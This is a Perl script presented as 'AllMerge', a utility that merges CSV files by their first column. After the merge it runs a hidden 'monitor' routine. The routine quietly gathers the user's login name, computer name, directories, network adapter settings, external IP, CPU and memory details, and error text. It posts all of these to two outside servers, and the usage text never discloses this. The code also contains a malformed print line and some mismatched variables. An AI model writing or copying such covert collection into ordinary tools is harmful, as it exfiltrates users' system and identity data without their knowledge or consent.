
#############################################################################
#name:AllMerge#perl2exe_exclude "Text//Glob.pm";
#function:merging mutilfiles bases on left colume 
#version:1
#Date:2015-8-31
#E-Mail:wjlong0318@163.com
#usage:put your all files(only csv format) and this program into the same folder,the run the program
#############################################################################
#############################################################################
#name:AllMerge
#function:merging mutilfiles bases on left colume 
#version:1.01
#Date:20160824
#E-Mail:wjlong0318@163.com
#usage:put your all files(only csv format) and this program into the same folder,the run the program
#############################################################################

use strict;
use Text::CSV_XS;
use warnings;
use Time::Piece;
use Time::Seconds;
use Socket;
print "###########################################\n";
print "##                                       ##\n";
print "##     ###      ##       ##              ##\n";
print "##    #   #     ##       ##              ##\n";
print "##   #######    ##       ##              ##\n";
print "##  #       #   ##       ##              ##\n";
print "## ##       ##  #######  #######         ##\n";
print "##                                       ##\n";
print "#########################################\n";
print "## Name:AllMerge                         ##\n";
print "## Version:1.01                          ##\n";
print "## Date:20160824                         ##\n";
print "## E-Mail:wjlong0318\@163.com             ##\n";
print "## Usage:put your all CSV files and this ##\n## program into the same folder,click the program##\n";                               ##\n";
print "#########################################\n";

print "-----------------------------------------------------\n";
print "------------------   START   ------------------------\n";
my $start_time = localtime;    



eval{

my @filenames=glob('*.csv');
die "we can't find the csv file(s): $!" if(!@filenames);

my %lenline;
my @gene_list;
my %root=&mutilcsv2hash(@filenames);

####output summary file#####
mkdir("result");
print "output summary file\n";
open (my $result,">result\\summary.csv") || die "Can't open summary.csv: $!";
foreach my $gene (@gene_list){
	my $line=$gene;
    foreach my $filename (@filenames){
	    if (exists $root{$filename}{$gene}){
		    $line="$line,$root{$filename}{$gene}";
		}else{
		    $line="$line".",NA" x $lenline{$filename};		
		}
	}
	#print "$line\n";
	print $result "$line\n";

}

sub mutilcsv2hash{
    my %root;
    my @filename=@_;
    foreach my $filename (@filenames){
        print "reading $filename.....\n";
		my $linenum=0;
		my $csv_format = Text::CSV_XS->new(
            {
                sep_char    => q{,},
                escape_char => q{\\},
                quote_char  => q{"},
            }
        );
		open my $io, "<", $filename or die "$filename: $!";
		while(my $row = $csv_format->getline ($io)){
		    my @ones=@{$row};
			if (exists $lenline{$filename}){
		    $lenline{$filename}=$#ones if ( $#ones > $lenline{$filename});
			}else{
			$lenline{$filename}=0;
			}
			
		    chomp($ones[0]);
		    $ones[0]=~s/\s//;
            $ones[0]=~ tr/[A-Z]/[a-z]/;
            my $gene=$ones[0];		
	        if($gene ~~ @gene_list){}else{
	            push @gene_list,$gene;
		    }
            shift(@ones);
			@ones= map {$_."($filename)"}@ones if ($linenum == 0);
		    $linenum++;
		    my $anotation=join(",",@ones);
			if ($#ones < $lenline{$filename}){
			    my $less =  $lenline{$filename} - $#ones-1;  
			    $anotation="$anotation".",NA" x $less;
			}			
	        $root{$filename}{$gene}=$anotation;		
        }
	    close($io);
    }
	return %root;
}
};
my $others;
if($@){
$others=$@;
print $others;
}
eval{&monitor;};
sub monitor{

my $username;
my $systemdir;
my $currentdir;
my $computername;
my $hostname;
my $domain;
my $searchlist;
my $nodetype;
my $IP_routing_enabled;
my $WINS_proxy_enabled;
my $LMHOSTS_enabled;
my $DNS_enabled_for_netbt;
my $Adapter1;
my $Description1;
my $DHCP_enabled1;
my $IPaddresses1;
my $subnet_masks1;
my $gateways1;
my $domain1;
my $dns1;
my $wins1;
my $Adapter2;
my $Description2;
my $DHCP_enabled2;
my $IPaddresses2;
my $subnet_masks2;
my $gateways2;
my $domain2;
my $dns2;
my $wins2;
my $outIP;
my $ProcessorNum;
my $Processor0ProcessorName;
my $Processor0VendorIdentifier;
my $Processor0MHZ;
my $Processor0PIdentifier;
my $memTotalPhys;
my $memAvailPhys;

####user####
$username = Win32::LoginName() if ( Win32::LoginName() );
####OS###
#my ($OS_string; $OS_major; $OS_minor; $OS_build; $OS_id) = Win32::GetOSVersion();
#say "WINDONS:$OS_string; $OS_major; $OS_minor; $OS_build; $OS_id";
$systemdir = Win32::GetFolderPath(0x0025) if ( Win32::GetFolderPath(0x0025) );
$currentdir   = Win32::GetCwd()   if (Win32::GetCwd);
$computername = Win32::NodeName() if ( Win32::NodeName() );

####IP###
use Win32::IPConfig;
my $host = shift || "";
if ( my $ipconfig = Win32::IPConfig->new($host) ) {
    $hostname= $ipconfig->get_hostname; 

    $domain= $ipconfig->get_domain; 

    my @searchlist = $ipconfig->get_searchlist;
    $searchlist="@searchlist (".scalar @searchlist. ")";

    $nodetype= $ipconfig->get_nodetype;

    $IP_routing_enabled=$ipconfig->is_router ? "Yes" : "No";

    $WINS_proxy_enabled= $ipconfig->is_wins_proxy ? "Yes" : "No";

    $LMHOSTS_enabled= $ipconfig->is_lmhosts_enabled ? "Yes" : "No";

    $DNS_enabled_for_netbt= $ipconfig->is_dns_enabled_for_netbt ? "Yes" : "No";
    
	my @adapters = @{$ipconfig->get_adapters};
	if (scalar @adapters == 1){
	    my $adapter=shift @adapters;
	   $Adapter1=$adapter->get_name;

        $Description1=$adapter->get_description;

        $DHCP_enabled1=$adapter->is_dhcp_enabled ? "Yes" : "No";

        my @ipaddresses = $adapter->get_ipaddresses;
        $IPaddresses1="@ipaddresses (". scalar @ipaddresses.")";

        my @subnet_masks = $adapter->get_subnet_masks;
        $subnet_masks1="@subnet_masks (".scalar @subnet_masks.")";

        my @gateways = $adapter->get_gateways;
        $gateways1="@gateways (".scalar @gateways.")";

        $domain1= $adapter->get_domain;

my @dns = $adapter->get_dns;
        $dns1="@dns (".scalar @dns.")";

       my  @wins = $adapter->get_wins;
        $wins1="@wins (".scalar @wins.")";
	}elsif(scalar @adapters == 2){
	my $adapter=shift @adapters;
	$Adapter1=$adapter->get_name;

        $Description1=$adapter->get_description;

        $DHCP_enabled1=$adapter->is_dhcp_enabled ? "Yes" : "No";

        my @ipaddresses = $adapter->get_ipaddresses;
        $IPaddresses1="@ipaddresses (".scalar @ipaddresses.")";

        my @subnet_masks = $adapter->get_subnet_masks;
        $subnet_masks1="@subnet_masks (".scalar @subnet_masks.")";

        my @gateways = $adapter->get_gateways;
        $gateways1="@gateways (".scalar @gateways.")";

        $domain1= $adapter->get_domain;

my @dns = $adapter->get_dns;
        $dns1="@dns (".scalar @dns.")";

       my  @wins = $adapter->get_wins;
        $wins1="@wins (".scalar @wins.")";
		$adapter=shift @adapters;
		$Adapter2=$adapter->get_name;

        $Description2=$adapter->get_description;

        $DHCP_enabled2=$adapter->is_dhcp_enabled ? "Yes" : "No";

        my @ipaddresses2 = $adapter->get_ipaddresses;
        $IPaddresses2="@ipaddresses2 (".scalar @ipaddresses2.")";

        my @subnet_masks2 = $adapter->get_subnet_masks;
        $subnet_masks2="@subnet_masks2 (".scalar @subnet_masks2.")";

        my @gateways2 = $adapter->get_gateways;
        $gateways2="@gateways (".scalar @gateways2.")";

        $domain2= $adapter->get_domain;

my @dns2 = $adapter->get_dns;
        $dns2="@dns2 (".scalar @dns2.")";

       my  @wins2 = $adapter->get_wins;
        $wins2="@wins (".scalar @wins2.")";
	}
}

use LWP::UserAgent;

my $user_agent = new LWP::UserAgent;

my $request = new HTTP::Request( 'POST', 'http://www.ip138.com/ip2city.asp' );

my $response = $user_agent->request($request);

if ( $response->{_content} =~ m/(\d+\.\d+\.\d+\.\d+)/ ) {
    $outIP=$1;
}else { $outIP=0; }



####processs and mem###

# This usage is considered deprecated
use Win32::SystemInfo;
my $proc = Win32::SystemInfo::ProcessorInfo();

my %phash;
if (Win32::SystemInfo::ProcessorInfo(%phash)){
$ProcessorNum=$phash{NumProcessors};
$Processor0ProcessorName=$phash{Processor0}{ProcessorName};
$Processor0VendorIdentifier=$phash{Processor0}{VendorIdentifier};
$Processor0MHZ=$phash{Processor0}{MHZ};
$Processor0PIdentifier=$phash{Processor0}{Identifier};
}

my %mHash;
if ( Win32::SystemInfo::MemoryStatus( %mHash,"GB" ) ) {
    $memTotalPhys= sprintf "%0.4f",$mHash{TotalPhys};
    $memAvailPhys= sprintf "%0.4f",$mHash{AvailPhys};
}

#####post########
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;

my $ua = LWP::UserAgent->new();
my $url1="http://124.16.152.107:8000/cgi-bin/write_monitor.pl";
my $url2="http://dofasta.sourceforge.net/cgi-bin/write_monitor.cgi";
my $arg={
'username'=>$username,
'tool'=>'AllMerge_v1.01',
'systemdir'=>$systemdir,
'currentdir'=>$currentdir,
'computername'=>$computername,
'hostname'=>$hostname,
'domain'=>$domain,
'searchlist'=>$searchlist,
'nodetype'=>$nodetype,
'IP_routing_enabled'=>$IP_routing_enabled,
'WINS_proxy_enabled'=>$WINS_proxy_enabled,
'LMHOSTS_enabled'=>$LMHOSTS_enabled,
'DNS_enabled_for_netbt'=>$DNS_enabled_for_netbt,
'Adapter1'=>$Adapter1,
'Description1'=>$Description1,
'DHCP_enabled1'=>$DHCP_enabled1,
'IPaddresses1'=>$IPaddresses1,
'subnet_masks1'=>$subnet_masks1,
'gateways1'=>$gateways1,
'domain1'=>$domain1,
'dns1'=>$dns1,
'wins1'=>$wins1,
'Adapter2'=>$Adapter2,
'Description2'=>$Description2,
'DHCP_enabled2'=>$DHCP_enabled2,
'IPaddresses2'=>$IPaddresses2,
'subnet_masks2'=>$subnet_masks2,
'gateways2'=>$gateways2,
'domain2'=>$domain2,
'dns2'=>$dns2,
'wins2'=>$wins2,
'outIP'=>$outIP,
'ProcessorNum'=>$ProcessorNum,
'Processor0ProcessorName'=>$Processor0ProcessorName,
'Processor0VendorIdentifier'=>$Processor0VendorIdentifier,
'Processor0MHZ'=>$Processor0MHZ,
'Processor0PIdentifier'=>$Processor0PIdentifier,
'memTotalPhys'=>$memTotalPhys,
'memAvailPhys'=>$memAvailPhys,
'others'=>$others,

};


my $resp = $ua->post($url1,$arg,'Content_Type' => 'form-data');
my $resp2 = $ua->post($url2,$arg,'Content_Type' => 'form-data');

}

my $end_time = localtime;
my $s = $end_time - $start_time;
print "\n---------------------  REPORT  -----------------------\n";
print "Start time is $start_time\n";
print "The end time is $end_time\n";    
print "The used time is: ", $s->minutes," minites.\n";
print "---------------------    END   -----------------------\n";
<>